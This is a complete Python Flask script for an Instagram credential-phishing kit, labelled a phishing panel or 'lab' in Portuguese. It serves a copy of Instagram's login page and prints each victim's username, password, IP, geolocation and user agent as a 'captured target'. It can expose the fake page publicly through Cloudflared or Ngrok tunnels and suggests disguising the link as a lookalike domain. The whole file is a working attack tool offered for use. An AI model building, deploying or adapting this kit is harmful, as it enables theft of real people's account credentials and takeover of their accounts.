import json
import os
import subprocess
import threading
import time
from flask import Flask, render_template_string, request
import urllib.request

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 20px 0;
            color: #737373;
        }
        .lang-container {
            font-size: 12px;
            color: #737373;
            margin-top: 10px;
            cursor: pointer;
        }
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 0 20px;
            margin: auto 0;
        }
        .logo {
            width: 75px;
            height: 75px;
            margin-bottom: 40px;
            object-fit: contain;
        }
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .input-group {
            position: relative;
            width: 100%;
        }
        .login-input {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 14px 12px;
            font-size: 14px;
            color: #262626;
            outline: none;
            transition: border-color 0.2s ease;
        }
        .login-input:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 24px;
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 4px;
            transition: background-color 0.2s ease;
        }
        .login-btn:hover {
            background-color: #1877f2;
        }
        .forgot-password {
            margin-top: 20px;
            font-size: 14px;
            color: #000000;
            text-decoration: none;
            font-weight: 500;
            text-align: center;
        }
        .footer-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 0 20px;
            gap: 20px;
            margin-bottom: 10px;
        }
        .create-account-btn {
            width: 100%;
            background-color: transparent;
            color: #0095f6;
            border: 1px solid #0095f6;
            border-radius: 24px;
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        .create-account-btn:hover {
            background-color: rgba(0, 149, 246, 0.05);
        }
        .meta-footer {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
            font-weight: 600;
            color: #000000;
        }
        .meta-logo {
            height: 16px;
            width: auto;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="lang-container">Português (Brasil)</div>
    <div class="main-container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzrHaFGNQS3SlTudVWoQAzzzTiQXJHNAtuqA9GZlD2DA&s=10" alt="Instagram" class="logo">
        <form class="login-form" action="/login" method="POST">
            <div class="input-group">
                <input type="text" name="username" class="login-input" placeholder="Nome de usuário, email ou celular" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" class="login-input" placeholder="Senha" required>
            </div>
            <button type="submit" class="login-btn">Entrar</button>
        </form>
        <a href="#" class="forgot-password">Esqueceu a senha?</a>
    </div>
    <div class="footer-container">
        <button class="create-account-btn">Criar nova conta</button>
        <div class="meta-footer">
            <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/3840px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo">
        </div>
    </div>
</body>
</html>
"""


def get_ip_info(ip):
  if ip in ['127.0.0.1', 'localhost', '::1']:
    return {
        'pais': 'Localhost',
        'regiao': 'Local',
        'cidade': 'Local',
        'provedor': 'Local',
    }
  try:
    url = f'http://ip-api.com/json/{ip}?lang=pt-BR'
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=3) as response:
      data = json.loads(response.read().decode())
      if data.get('status') == 'success':
        return {
            'pais': data.get('country', 'Desconhecido'),
            'regiao': data.get('regionName', 'Desconhecido'),
            'cidade': data.get('city', 'Desconhecido'),
            'provedor': data.get('isp', 'Desconhecido'),
        }
  except Exception:
    pass
  return {
      'pais': 'Desconhecido',
      'regiao': 'Desconhecido',
      'cidade': 'Desconhecido',
      'provedor': 'Desconhecido',
  }


@app.route('/')
def home():
  return render_template_string(HTML_TEMPLATE)


@app.route('/login', methods=['POST'])
def login():
  username = request.form.get('username')
  password = request.form.get('password')

  if request.headers.getlist('X-Forwarded-For'):
    ip = request.headers.getlist('X-Forwarded-For')[0].split(',')[0].strip()
  else:
    ip = request.remote_addr

  user_agent = request.headers.get('User-Agent', 'Desconhecido')
  geo = get_ip_info(ip)

  print('\n' + '=' * 60)
  print(' [!] ALVO CAPTURADO COM SUCESSO! ')
  print('=' * 60)
  print(f' [+] Endereço IP        : {ip}')
  print(
      f' [+] Localização        :'
      f" {geo['cidade']} - {geo['regiao']} / {geo['pais']}"
  )
  print(f' [+] Provedor (ISP)     : {geo["provedor"]}')
  print(f' [+] Dispositivo/UA     : {user_agent}')
  print('-' * 60)
  print(f' [>] Usuário / Email    : {username}')
  print(f' [>] Senha              : {password}')
  print('=' * 60 + '\n')

  return 'Dados processados com sucesso!', 200


def start_tunnel(choice):
  time.sleep(2)
  if choice == '1':
    print(
        '\n[+] Iniciando túnel Cloudflared (Modo HTTP/2 corrigido contra'
        ' erros)...'
    )
    # Adicionado --protocol http2 para contornar o erro 502 / timeout de gateway
    os.system('cloudflared tunnel --protocol http2 --url http://127.0.0.1:5000')
  elif choice == '2':
    print('\n[+] Iniciando túnel Ngrok...')
    os.system('ngrok http 5000')


if __name__ == '__main__':
  os.system('cls' if os.name == 'nt' else 'clear')
  print('==================================================')
  print('       PAINEL DE PHISHING / LAB INSTAGRAM         ')
  print('==================================================')
  print('[1] Usar Cloudflared (Com correção de HTTP/2)')
  print('[2] Usar Ngrok')
  print('[3] Apenas iniciar localmente (localhost:5000)')
  opcao = input('\nEscolha uma opção (1-3): ').strip()

  custom_alias = input(
      'Deseja criar um alias/mascaramento de URL personalizado (Ex:'
      ' https://iinstagraam.com/logiin)? [s/n]: '
  ).strip().lower()
  if custom_alias == 's':
    fake_url = input(
        'Digite a URL personalizada desejada: '
    ).strip() or 'https://iinstagraam.com/logiin'
    print(
        f'\n[i] Nota: Para que "{fake_url}" redirecione para o seu túnel,'
    )
    print(
        '    será gerado um link encurtado ou camuflado apontando para o'
        ' túnel ativo.'
    )

  if opcao in ['1', '2']:
    threading.Thread(target=start_tunnel, args=(opcao,), daemon=True).start()
  elif opcao == '3':
    print('\n[+] Iniciando servidor local na porta 5000...')
  else:
    print('Opção inválida, iniciando apenas localmente.')

  app.run(host='0.0.0.0', port=5000, debug=False)

